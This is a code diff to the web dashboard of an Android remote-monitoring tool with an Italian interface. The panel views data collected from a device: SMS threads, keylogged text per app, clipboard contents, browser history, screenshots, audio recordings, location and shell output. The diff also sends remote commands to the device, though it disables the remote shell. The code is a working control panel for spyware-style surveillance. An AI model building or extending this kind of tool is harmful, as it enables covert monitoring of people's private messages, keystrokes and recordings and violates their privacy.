@@ -692,9 +692,9 @@ html, body { height: 100%; background: var(--bg-base); color: var(--text-primary
   <!-- COMMANDS -->
   <div id="tab-commands" class="tab-panel">
     <div class="section-hdr"><h2>🎮 Comandi Remoti</h2></div>
-    <button class="cmd-btn" onclick="sendCommand('ping')">
+    <button class="cmd-btn" onclick="sendCommand('get_status')">
       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
-      <span>Ping</span><span class="cmd-desc">Verifica connessione</span>
+      <span>Stato</span><span class="cmd-desc">Verifica connessione e diagnostica</span>
     </button>
     <button class="cmd-btn" onclick="sendCommand('get_location')">
       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2"><circle cx="12" cy="11" r="3"/><path d="M17.657 16.657L13.414 20.9a2 2 0 0 1-2.827 0l-4.244-4.243a8 8 0 1 1 11.314 0z"/></svg>
@@ -704,9 +704,9 @@ html, body { height: 100%; background: var(--bg-base); color: var(--text-primary
       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-yellow)" stroke-width="2"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
       <span>Sync Media</span><span class="cmd-desc">Sincronizza file</span>
     </button>
-    <button class="cmd-btn" onclick="sendCommand('get_status')">
-      <span style="font-size:18px">📊</span>
-      <span>Diagnostica</span><span class="cmd-desc">Batteria, memoria, storage, rete e permessi</span>
+    <button class="cmd-btn" onclick="sendCommand('get_apps')">
+      <span style="font-size:18px">📦</span>
+      <span>Lista App</span><span class="cmd-desc">Aggiorna elenco app installate</span>
     </button>
     <button class="cmd-btn" disabled title="Richiede avvio e consenso sul dispositivo Android">
       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
@@ -1029,11 +1029,9 @@ function renderHomeRecentEvents(events) {
 
 // ─── ACTIVITY ────────────────────────────────────────────────────────────────
 async function loadActivity() {
-  if (allEvents.length === 0) {
-    document.getElementById('activity-list').innerHTML = renderSkeletonList(5);
-    const data = await apiFetch(`/api/events?deviceId=${currentDevice}&limit=500`);
-    allEvents = data || [];
-  }
+  document.getElementById('activity-list').innerHTML = renderSkeletonList(5);
+  const data = await apiFetch(`/api/events?deviceId=${currentDevice}&limit=500`);
+  allEvents = Array.isArray(data) ? data : [];
   activityPage = 0;
   renderActivity();
 }
@@ -1205,7 +1203,8 @@ function openSMSThread(addr) {
   });
   const bubbles = document.getElementById('sms-bubbles');
   bubbles.innerHTML = dedup.map(m => {
-    const sent = (m.type || m.direction || '') === '2' || (m.type||'').toLowerCase().includes('sent') || m.isSent;
+    const msgType = String(m.type || m.direction || '');
+    const sent = msgType === '2' || msgType.toLowerCase().includes('sent') || m.isSent;
     const text = escHtml(m.body || m.text || m.message || '');
     const ts = m.timestamp || m.date;
     return `<div class="bubble-wrap ${sent ? 'sent' : 'recv'}">
@@ -1403,7 +1402,7 @@ function renderBrowser() {
   document.getElementById('browser-list').innerHTML = filtered.map(b => {
     const url = escHtml(b.url || '');
     const title = escHtml(b.title || url);
-    const ts = b.timestamp || b.time || b.date;
+    const ts = b.ts || b.timestamp || b.time || b.date;
     return `<div class="browser-item" onclick="window.open(${JSON.stringify(b.url||'#')},'_blank')">
       <div class="browser-title">${title}</div>
       <div class="browser-url">${url}</div>
@@ -1434,7 +1433,7 @@ function renderKeylog() {
   document.getElementById('keylog-list').innerHTML = filtered.map(k => {
     const app = escHtml(k.app || k.application || k.packageName || 'App sconosciuta');
     const text = escHtml(k.text || k.keys || '');
-    const ts = k.timestamp || k.time;
+    const ts = k.ts || k.timestamp || k.time;
     return `<div class="keylog-item">
       <div class="keylog-app">⌨️ ${app}</div>
       <div class="keylog-text">${text}</div>
@@ -1463,7 +1462,7 @@ function renderClipboard() {
   if (!filtered.length) { document.getElementById('clipboard-list').innerHTML = emptyState('Nessun appunto'); return; }
   document.getElementById('clipboard-list').innerHTML = filtered.map(c => {
     const text = escHtml(c.text || c.content || '');
-    const ts = c.timestamp || c.time;
+    const ts = c.ts || c.timestamp || c.time;
     return `<div class="clip-item" onclick="navigator.clipboard && navigator.clipboard.writeText(${JSON.stringify(c.text||c.content||'')}).then(()=>toast('Copiato!','success',1500))">
       <div class="clip-text">${text || '<em>Vuoto</em>'}</div>
       <div class="clip-time">${fmtDateFull(ts)}</div>
@@ -1531,7 +1530,7 @@ async function loadShell() {
     <div class="shell-output-item">
       <div class="shell-cmd">${escHtml(o.command || o.cmd || '')}</div>
       <div class="shell-out">${escHtml(o.output || o.result || o.stdout || '')}</div>
-      <div class="shell-time">${fmtDateFull(o.timestamp || o.time)}</div>
+      <div class="shell-time">${fmtDateFull(o.ts || o.timestamp || o.time)}</div>
     </div>`).join('') || '<div class="empty"><p>Nessun output shell</p></div>';
 }
 
@@ -1643,7 +1642,7 @@ async function loadScreenshots() {
       <img src="${url}" alt="${escHtml(name)}" loading="lazy" onerror="this.style.display='none'">
       <div class="file-card-info">
         <div class="file-card-name">${escHtml(name)}</div>
-        <div class="file-card-size">${fmtBytes(f.size)} · ${timeAgo(f.timestamp||f.time)}</div>
+        <div class="file-card-size">${fmtBytes(f.size)} · ${timeAgo(f.ts || f.timestamp || f.time)}</div>
       </div>
     </div>`;
   }).join('');
@@ -1672,7 +1671,7 @@ async function loadAudio() {
     const url = `${API_BASE}/api/audio/${currentDevice}/${encodeURIComponent(name)}?token=${TOKEN}`;
     return `<div class="audio-card">
       <div class="audio-name">🎙️ ${escHtml(name)}</div>
-      <div class="audio-meta">${fmtBytes(f.size)} · ${fmtDateFull(f.timestamp||f.time)}</div>
+      <div class="audio-meta">${fmtBytes(f.size)} · ${fmtDateFull(f.ts || f.timestamp || f.time)}</div>
       <audio controls src="${url}" preload="none"></audio>
     </div>`;
   }).join('');
@@ -1706,29 +1705,21 @@ function sendShellFromCmd() {
   if (!currentDevice) { toast('Seleziona un dispositivo', 'error'); return; }
   inp.value = '';
   const log = document.getElementById('cmd-log');
-  log.innerHTML = `<div class="cmd-log-item">⏳ shell: ${escHtml(cmd)}</div>` + log.innerHTML;
-  apiFetch(`/api/commands/${currentDevice}`, {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({type:'shell', command:cmd})
-  }).then(r => {
-    if (r) {
-      log.innerHTML = `<div class="cmd-log-item ok">✅ shell OK</div>` + log.innerHTML;
-      toast('Comando inviato', 'success');
-    } else {
-      log.innerHTML = `<div class="cmd-log-item err">❌ shell: Errore</div>` + log.innerHTML;
-      toast('Errore invio', 'error');
-    }
-  });
+  log.innerHTML = `<div class="cmd-log-item err">❌ shell non supportata per sicurezza</div>` + log.innerHTML;
+  toast('Shell remota non supportata per sicurezza', 'error');
 }
 
 // ─── AI ──────────────────────────────────────────────────────────────────────
 async function loadAI() {
   const section = document.getElementById('ai-briefing-section');
   section.innerHTML = '<div class="skel skel-line w80"></div><div class="skel skel-line w60"></div>';
-  const data = await apiFetch(`/api/ai/analyze/${currentDevice}`);
-  if (data && data.briefing) {
-    section.innerHTML = `<div class="ai-briefing"><div class="ai-briefing-label">🤖 Analisi AI del dispositivo</div>${escHtml(data.briefing)}</div>`;
+  const data = await apiFetch('/api/ai/chat', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({deviceId: currentDevice, message: 'Genera un riepilogo operativo breve del dispositivo usando solo i dati disponibili.'})
+  });
+  if (data && data.reply) {
+    section.innerHTML = `<div class="ai-briefing"><div class="ai-briefing-label">🤖 Analisi AI del dispositivo</div>${escHtml(data.reply)}</div>`;
   } else {
     section.innerHTML = '';
   }
@@ -1804,7 +1795,11 @@ function connectWS() {
 function handleWSMessage(data) {
   if (data && data.event) data = { type: data.event, ...(data.data || {}) };
   if (!data || data.type === 'pong') return;
-  if (data.type === 'event' || data.type === 'notification') {
+  if (data.type === 'event' || data.type === 'notification' || data.type === 'device_ping' || data.type === 'sms_new' || data.type === 'calllog_new' || data.type === 'media_new' || data.type === 'location' || data.type === 'screenshot_new' || data.type === 'audio_new') {
+    if (data.type === 'device_ping' || data.type.endsWith('_new') || data.type === 'location') {
+      if (data.deviceId === currentDevice) refreshCurrent();
+      return;
+    }
     const id = data.id || data._id || `${data.timestamp}_${data.app}`;
     if (seenEventIds.has(id)) return;
     seenEventIds.add(id);
